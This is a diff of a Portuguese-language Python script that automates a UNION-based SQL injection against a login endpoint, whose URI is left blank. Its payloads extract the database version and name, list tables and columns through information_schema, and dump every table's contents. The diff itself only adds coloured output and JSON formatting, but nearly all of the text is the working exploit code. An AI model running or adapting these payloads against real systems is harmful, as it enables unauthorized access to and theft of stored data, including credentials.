@@ -1,4 +1,4 @@
-import requests
+import requests, json
 
 URI = ''
 
@@ -18,9 +18,7 @@ def resultado_total(data):
 
 def versao():
     payload = '\' or 1 = 1 UNION SELECT @@version, null, null  limit 3,1#'
-    print('Versão do banco: ', resultado_total(payload))
-
-
+    print('\033[93m'+'Versão do banco: ', resultado_total(payload),'\033[0m')
 
 
 def nome_banco():
@@ -28,8 +26,7 @@ def nome_banco():
     
     payload = '\' or 1 = 1 UNION SELECT database(), null, null limit 3,1 #'
     NOME_BANCO = resultado_total(payload)    
-    print('Nome do banco: ', NOME_BANCO)
-
+    print('\033[93m'+'Nome do banco: ', NOME_BANCO,'\033[0m')
 
 
 def nome_tabela():
@@ -44,10 +41,9 @@ information_schema.tables where table_schema in (SELECT DATABASE()) limit {},1 #
     while 'senha invalida' not in tmp:
         tmp = resultado_total(payload.format(ct))
         tabelas[tmp] = {}   # o indice 1 é para tirar um caracter special
-        print('Nome de tabela: ', tmp)
+        print('\033[93m','Nome de tabela: ', tmp,'\033[0m')
         ct += 1 
         
-
 
 def nome_coluna():
     global tabelas
@@ -59,7 +55,7 @@ where table_name = \'{}\' limit {},1 #'
         ct = 3
         tmp = resultado_total(payload.format(i, ct))
         while 'senha invalida' not in tmp:
-            print('Descorbeto a coluna \'{}\' da tabela \'{}\''.format(tmp, i))
+            print('\033[93m'+'Descorbeto a coluna \'{}\' da tabela \'{}\''.format(tmp, i),'\033[0m')
             tabelas[i][tmp] = []
             ct += 1 
             tmp = resultado_total(payload.format(i ,ct))
@@ -79,20 +75,20 @@ def resultado_tabelas():
                 tabelas[i][j].append(tmp)
                 ct += 1 
                 tmp = resultado_total(payload.format(j,i,ct))
-    print(tabelas)
+    print('\033[93m',json.dumps(tabelas, indent=4),'\033[0m')
 
  
 if __name__ == '__main__':
     try:
-        print('Descobrindo a versão:\n')
+        print('\033[92m'+'Descobrindo a versão:\n')
         versao()
-        print(60*'_'+'\n\nDescobrindo o nome do banco:\n')
+        print(60*'_'+'\n\n'+'\033[92m'+'Descobrindo o nome do banco:\n')
         nome_banco()
-        print(60*'_'+'\n\nDescobrindo as tabelas:\n')
+        print(60*'_'+'\n\n'+'\033[92m'+'Descobrindo as tabelas:\n')
         nome_tabela()
-        print(60*'_'+'\n\nDescobrindo as colunas:\n')
+        print(60*'_'+'\n\n'+'\033[92m'+'Descobrindo as colunas:\n')
         nome_coluna()
-        print(60*'_'+'\n\nMostrando resultado\n')
+        print(60*'_'+'\n\n'+'\033[92m'+'Mostrando resultado\n')
         resultado_tabelas()
     except KeyboardInterrupt:
         exit()
